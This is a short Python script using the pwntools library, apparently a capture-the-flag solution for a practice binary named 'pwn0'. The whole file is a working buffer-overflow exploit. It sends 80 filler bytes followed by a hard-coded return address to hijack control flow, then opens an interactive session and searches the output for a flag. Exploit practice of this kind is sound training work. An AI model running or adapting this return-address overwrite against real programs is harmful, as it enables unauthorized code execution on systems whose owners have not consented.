from pwn import *

context.binary = "./pwn0"

p = process()
p.sendline(b"A"*80+p32(0x080484dd))
p.interactive()
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
